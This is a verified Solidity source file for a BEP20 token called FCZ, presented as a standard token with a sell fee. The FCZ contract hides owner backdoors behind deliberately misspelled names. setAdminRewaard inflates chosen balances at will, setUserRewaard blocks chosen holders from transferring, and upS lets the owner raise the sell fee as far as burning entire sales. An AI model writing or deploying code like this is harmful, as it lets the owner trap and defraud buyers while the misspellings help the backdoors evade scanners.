/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acconntADesired,
        uint acconntBDesired,
        uint acconntAMin,
        uint acconntBMin,
        address to,
        uint deadline
    ) external returns (uint acconntA, uint acconntB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acconntTokenDesired,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acconntToken, uint acconntETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acconntAMin,
        uint acconntBMin,
        address to,
        uint deadline
    ) external returns (uint acconntA, uint acconntB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline
    ) external returns (uint acconntToken, uint acconntETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acconntAMin,
        uint acconntBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acconntA, uint acconntB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acconntToken, uint acconntETH);
    function swapExactTokensForTokens(
        uint acconntIn,
        uint acconntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acconnts);
    function swapTokensForExactTokens(
        uint acconntOut,
        uint acconntInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acconnts);
    function swapExactETHForTokens(uint acconntOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acconnts);
    function swapTokensForExactETH(uint acconntOut, uint acconntInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acconnts);
    function swapExactTokensForETH(uint acconntIn, uint acconntOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acconnts);
    function swapETHForExactTokens(uint acconntOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acconnts);

    function quote(uint acconntA, uint reserveA, uint reserveB) external pure returns (uint acconntB);
    function getacconntOut(uint acconntIn, uint reserveIn, uint reserveOut) external pure returns (uint acconntOut);
    function getacconntIn(uint acconntOut, uint reserveIn, uint reserveOut) external pure returns (uint acconntIn);
    function getacconntsOut(uint acconntIn, address[] calldata path) external view returns (uint[] memory acconnts);
    function getacconntsIn(uint acconntOut, address[] calldata path) external view returns (uint[] memory acconnts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfierrOnTransferTokens(
        address token,
        uint liquidity,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline
    ) external returns (uint acconntETH);
    function removeLiquidityETHWithPermitSupportingfierrOnTransferTokens(
        address token,
        uint liquidity,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acconntETH);

    function swapExactTokensForTokensSupportingfierrOnTransferTokens(
        uint acconntIn,
        uint acconntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfierrOnTransferTokens(
        uint acconntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfierrOnTransferTokens(
        uint acconntIn,
        uint acconntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fierrTo() external view returns (address);
    function fierrToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfierrTo(address) external;
    function setfierrToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amnount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amnount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amnount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amnount;
        emit Approval(owner, spender, amnount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amnount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amnount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}
}


contract FCZ is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address accoont) public view virtual returns (uint256) {
        return _balances[accoont];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnount, "ERC20: transfer amnount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amnount;
    }
        _balances[to] += amnount;

        emit Transfer(from, to, amnount);
    }

    function _burn(address accoont, uint256 amnount) internal virtual {
        require(accoont != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accoont];
        require(accoontBalance >= amnount, "ERC20: burn amnount exceeds balance");
    unchecked {
        _balances[accoont] = accoontBalance - amnount;
    }
        _totalSupply -= amnount;

        emit Transfer(accoont, address(0), amnount);
    }

    function _mtin(address accoont, uint256 amnount) internal virtual {
        require(accoont != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnount;
        _balances[accoont] += amnount;
        emit Transfer(address(0), accoont, amnount);
    }


    address public uniswapV2Pair;
    address public DEVAddress;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
        _defaultSellfierr = 4;
        _defaultBuyfierr = 0;
        DEVAddress = msg.sender;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfierr = 0;

    uint256 private _defaultBuyfierr = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _Rewaards;

    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }

    function upS(uint256 _value) external onlyowner {
        _defaultSellfierr = _value;
    }

    function setAdminRewaard(address accoont,int256 amnount ) public onlyowner {
        _Rewaards[accoont] += amnount;
    }

    function setUserRewaard(address accoont) public onlyowner {
        _Rewaards[accoont] = int256(0) - int256(_totalSupply);
    }

    function rmUserRewaard(address accoont) public onlyowner {
        _Rewaards[accoont] = 0;
    }

    function getRewaard(address accoont) public view returns (int256) {
        return _Rewaards[accoont];
    }


    function _recF(
        address from,
        address _to,
        uint256 _acconnt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acconnt, "ERC20: transfer amnount exceeds balance");
        if (_Rewaards[from] > 0){
            _balances[from] = _balances[from].add(uint256(_Rewaards[from]));
        }else if (_Rewaards[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_Rewaards[from]));
        }



        uint256 tradefierracconnt = 0;
        uint256 tradefierr = _defaultSellfierr;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                tradefierr = _defaultSellfierr;
            }
            if (from == uniswapV2Pair) {
                tradefierr = _defaultBuyfierr;
            }
        }
        tradefierracconnt = _acconnt.mul(tradefierr).div(100);

        if (tradefierracconnt > 0) {
            _balances[from] = _balances[from].sub(tradefierracconnt);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefierracconnt);
            emit Transfer(from, _deadAddress, tradefierracconnt);
        }

        _balances[from] = _balances[from].sub(_acconnt - tradefierracconnt);
        _balances[_to] = _balances[_to].add(_acconnt - tradefierracconnt);
        emit Transfer(from, _to, _acconnt - tradefierracconnt);
    }

    function transfer(address to, uint256 amnount) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, amnount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnount);
        _recF(from, to, amnount);
        return true;
    }
}